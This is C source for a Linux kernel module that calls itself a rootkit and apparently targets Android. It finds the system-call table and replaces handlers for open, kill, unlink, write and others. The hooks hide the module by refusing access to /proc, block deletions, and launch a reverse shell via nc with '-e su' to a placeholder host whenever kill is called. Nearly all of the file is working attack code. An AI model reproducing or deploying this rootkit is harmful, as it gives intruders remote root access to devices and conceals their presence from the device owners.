#include <linux/init_task.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/compat.h>


#define AUTHOR "Hitesh Dharmdasani <hdharmda@gmu.edu>"
#define DESCRIPTION 	"This rookit is developed to intercept the following calls\n \\
						 SYS_WRITE, SYS_READ ,SYS_CREAT ,SYS_MKDIR ,SYS_RMDIR ,SYS_KILL ,SYS_OPEN ,SYS_CLOSE ,\n \\
						 SYS_GETDENT ,SYS_UNLINK, SYS_KILL \n \\
						 \\
						"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217

#define __NR_INIT_MOD 128
#define __NR_UNLINK 10
#define __NR_DEL_MOD 129
#define __NR_EXECVE 11
#define __NR_MKDIR 39
#define __NR_RMDIR 40
#define __NR_READ 3
#define __NR_WRITE 4
#define __NR_OPEN 5
#define __NR_CLOSE 6
#define __NR_CREAT 8
#define __NR_STAT 18


/*must be defined because of syscall macro used below*/
int errno;

//Definition of my systemcall
int __NR_myexecve;

static void **sys_call_table;
int comm_offset=0;
int cred_offset=0;
int pid_offset=0;
int parent_offset=0;
int next_offset=0;


asmlinkage long (*orig_stat)(const char __user *filename,struct __old_kernel_stat __user *statbuf);
asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len,const char __user *uargs);
asmlinkage long (*orig_delete_module)(const char __user *name_user, unsigned int flags);
asmlinkage long (*orig_unlink)(const char __user *pathname);
asmlinkage long (*orig_getdents64)(unsigned int fd,struct linux_dirent64 __user *dirent,unsigned int count);
asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
asmlinkage long (*orig_rmdir)(const char __user *pathname);
asmlinkage ssize_t (*orig_open) (const char *pathname, int flags);
asmlinkage ssize_t (*orig_close) (int fd);
asmlinkage long (*orig_creat) (const char __user *pathname, umode_t mode);
asmlinkage int (*orig_execve)(const char *filename, char *const argv[],char *const envp[], struct pt_regs *regs);
asmlinkage int (*orig_kill)(pid_t pid, int sig);
asmlinkage ssize_t (*orig_writev)(int fd,struct iovec *vector,int count);
// asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage uid_t (*orig_getuid)(void);


/* Get the address of sys_call_table as a pointer. All further references are through indexing this pointer */
void get_sys_call_table(){

	// Interrupt tables are loaded in high memory in android starting at 0xffff0000

	void *swi_table_addr=(long *)0xffff0008; // Known address of Software Interrupt handler
	unsigned long offset_from_swi_vector_adr=0;
	unsigned long *swi_vector_adr=0;

	offset_from_swi_vector_adr=((*(long *)swi_table_addr)&0xfff)+8;
	swi_vector_adr=*(unsigned long *)(swi_table_addr+offset_from_swi_vector_adr);

	while(swi_vector_adr++){
		if(((*(unsigned long *)swi_vector_adr)&0xfffff000)==0xe28f8000){ // Copy the entire sys_call_table from the offset_from_swi_vector_adr starting the hardware interrupt table
			offset_from_swi_vector_adr=((*(unsigned long *)swi_vector_adr)&0xfff)+8;		  // 0xe28f8000 is end of interrupt space. Hence we stop.
			sys_call_table=(void *)swi_vector_adr+offset_from_swi_vector_adr;
			break;
		}
	}
	return;
}

asmlinkage uid_t our_getuid(void){
	printk("Running our_getuid");
	struct uid_t *tmp;
	tmp=(*orig_getuid)();
	return tmp;
}


asmlinkage ssize_t our_unlink(const char __user *pathname)
{
	if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") )
		return -1;
        printk (KERN_INFO "SYS_UNLINK: %s\n",pathname);
        return orig_unlink(pathname);
}

asmlinkage ssize_t our_read (int fd, char *buf, size_t count)
{
        printk (KERN_INFO "SYS_READ: %s\n",buf);
        return orig_read(fd,buf,count);
}
asmlinkage ssize_t our_write (int fd, char *buf, size_t count)
{
	if(strstr(buf,"sleep"))
		return -1;
   	 printk (KERN_INFO "SYS_WRITE: %s\n",buf);
    return orig_write(fd,buf,count);
}


asmlinkage ssize_t our_creat (const char __user *pathname, umode_t mode)
{
        printk (KERN_INFO "SYS_CREAT %s\n",pathname);
        return orig_creat(pathname,mode);
}
asmlinkage long our_delete_module(const char __user *name_user, unsigned int flags)
{
		printk (KERN_INFO "SYS_DELETE_MODULE: %s",name_user);
		return orig_delete_module(name_user,flags);
}
asmlinkage long our_init_module(void __user *umod, unsigned long len,const char __user *uargs)
{
		printk (KERN_INFO "SYS_INIT_MODULE: %s",uargs);
		return orig_init_module(umod,len,uargs);
}
asmlinkage ssize_t our_mkdir (const char __user *pathname, umode_t mode)
{
        printk (KERN_INFO "SYS_MKDIR %s\n",pathname);
        return orig_mkdir(pathname,mode);
}
asmlinkage ssize_t our_rmdir (const char __user *pathname)
{
        printk (KERN_INFO "SYS_RMDIR %s\n",pathname);
        return orig_rmdir(pathname);
}

asmlinkage ssize_t our_close(int fd)
{
        printk(KERN_INFO "SYS_CLOSE %s\n",current->comm);
        return orig_close(fd);
}

asmlinkage int our_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
	struct linux_dirent64 *td1,*td2;
	long ret,tmp;
	unsigned long hpid;
	int mover,process;

	ret=(*orig_getdents64)(fd,dirp,count);

	if(!ret)
		return ret;

	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
	copy_from_user(td2,dirp,ret);

	td1=td2;
	tmp=ret;
    hpid=simple_strtoul(td1->d_name,NULL,10);
    printk("our_getdents64: %u",hpid);
	tmp-=td1->d_reclen;
	if(td1->d_name) {
		printk("\nIntercepting %s",td1->d_name);
	}

	copy_to_user((void *)dirp,(void *)td2,ret);
	kfree(td2);
	return ret;
}

void reverse_shell()
{
	char *path="/system/xbin/nc";
	char *argv[]={"IP/DOMAIN HERE","PORT_NO","-e","su","&",NULL};
	char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};
	call_usermodehelper(path,argv,envp,1);
}

asmlinkage int our_kill(pid_t pid, int sig)
{
	reverse_shell();
	printk(KERN_INFO "SYS_KILL: %d\n",pid);

	return (*orig_kill)(pid,sig);
}

asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
{
	printk(KERN_INFO "SYS_WRITEV ");
	return orig_writev(fd,vector,count);
}


asmlinkage ssize_t our_open(const char *pathname, int flags)
{
	if(strstr(pathname,"/proc/modules") || strstr(pathname,"hello") || strstr(pathname,"/proc"))
	{
		printk(KERN_INFO "Forbidden: Listing modules cancelled.");
		return -1;
	}
	printk(KERN_INFO "SYS_OPEN: %s\n",pathname);
	return orig_open(pathname,flags);
}
 asmlinkage long our_stat(const char __user *filename,struct __old_kernel_stat __user *statbuf)
{
	printk(KERN_INFO "SYS_STAT: %s\n",filename);
	return orig_stat(filename,statbuf);
}

int init_module(void)
{

	// find_offset();
	get_sys_call_table();

	// Get address of sys_calls and store good copy
	orig_getdents64 = sys_call_table[__NR_GETDENTS64];
	orig_write = sys_call_table[__NR_WRITE];
	orig_kill = sys_call_table[__NR_KILL];
	orig_close = sys_call_table[__NR_CLOSE];
	orig_open = sys_call_table[__NR_OPEN];
	orig_creat = sys_call_table[__NR_CREAT];
	orig_rmdir = sys_call_table[__NR_RMDIR];
	orig_mkdir = sys_call_table[__NR_MKDIR];
	orig_getuid = sys_call_table[__NR_GETUID];
	orig_unlink = sys_call_table[__NR_UNLINK];
	orig_execve = sys_call_table[__NR_EXECVE];
	orig_stat = sys_call_table[__NR_STAT];
	orig_delete_module = sys_call_table[__NR_DEL_MOD];
	orig_init_module = sys_call_table[__NR_INIT_MOD];

	// Overwrite sys_call_table with our versions of sys_calls

	sys_call_table[__NR_INIT_MOD] = our_init_module;
	sys_call_table[__NR_DEL_MOD] = our_delete_module;
	sys_call_table[__NR_WRITE] = our_write;
	sys_call_table[__NR_UNLINK] = our_unlink;
	sys_call_table[__NR_GETDENTS64] = our_getdents64;
	sys_call_table[__NR_MKDIR] = our_mkdir;
	sys_call_table[__NR_RMDIR] = our_rmdir;
	sys_call_table[__NR_CREAT] = our_creat;
	sys_call_table[__NR_CLOSE] = our_close;
	sys_call_table[__NR_KILL] = our_kill;
	sys_call_table[__NR_OPEN] = our_open;
	sys_call_table[__NR_GETUID] = our_getuid;
	sys_call_table[__NR_STAT] = our_stat;

	return 0;
}

void cleanup_module(void)
{

	// Need to un-load cleanly. Write peristence into file with read-only access to reload.
	sys_call_table[__NR_WRITE] = orig_write;
	sys_call_table[__NR_GETDENTS64]=orig_getdents64;
	sys_call_table[__NR_KILL]=orig_kill;
	sys_call_table[__NR_CLOSE]=orig_close;
	sys_call_table[__NR_OPEN]=orig_open;
	sys_call_table[__NR_CREAT]=orig_creat;
	sys_call_table[__NR_RMDIR]=orig_rmdir;
	sys_call_table[__NR_MKDIR]=orig_mkdir;
	sys_call_table[__NR_GETUID]=orig_getuid;
	sys_call_table[__NR_UNLINK]=orig_unlink;
	sys_call_table[__NR_STAT] = orig_stat;
	sys_call_table[__NR_INIT_MOD] = orig_init_module;
	sys_call_table[__NR_DEL_MOD] = orig_delete_module;

}
